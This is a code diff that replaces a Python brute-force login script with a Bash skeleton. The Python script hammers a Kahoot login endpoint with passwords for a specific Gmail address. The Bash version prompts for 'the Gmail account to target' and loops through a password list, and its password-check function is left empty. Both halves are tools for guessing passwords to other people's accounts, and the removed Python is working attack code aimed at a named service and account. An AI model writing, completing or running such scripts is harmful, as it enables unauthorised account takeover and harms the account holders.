@@ -1,32 +1,24 @@
-import requests
+#!/bin/bash
 
-def brute_force_login(url, username, password_file):
-    with open(password_file, 'r') as file:
-        passwords = (line.strip() for line in file)
+# Function to check if the password is correct
+check_password() {
+    # Add your code here to check if the password is correct
+    # Return 0 if the password is correct, 1 otherwise
+}
 
-    session = requests.Session()
+# Prompt the user to enter the Gmail account to target
+read -p "Enter the Gmail account to target: " gmail_account
 
-    for password in passwords:
-        payload = {'username': username, 'password': password}
+# Prompt the user to enter the path to the password list
+read -p "Enter the path to the password list: " password_list
 
-        try:
-            response = session.post(url, data=payload)
-            response.raise_for_status()
-
-            if response.status_code == 200:
-                print(f"Successful login! Username: {username}, Password: {password}")
-                break
-
-        except requests.exceptions.RequestException as e:
-            print(f"An error occurred: {e}")
-            break
-
-    print("Brute force attack completed.")
-
-# Usage example
-url = 'https://create.kahoot.it/auth/login?deviceId=f31cd72d-3ccf-47a6-b643-3f166351d0d4R&sessionId=1698919889501'
-username = 'ssjsssksjsjs@gmail.com'
-password_file = 'passlist.txt'
-
-brute_force_login(url, username, password_file)
+# Read the password list file line by line
+while IFS= read -r password; do
+    # Attempt the password
+    echo "Trying password: $password"
+    if check_password "$password"; then
+        echo "Correct password found: $password"
+        break
+    fi
+done < "$password_list"
 
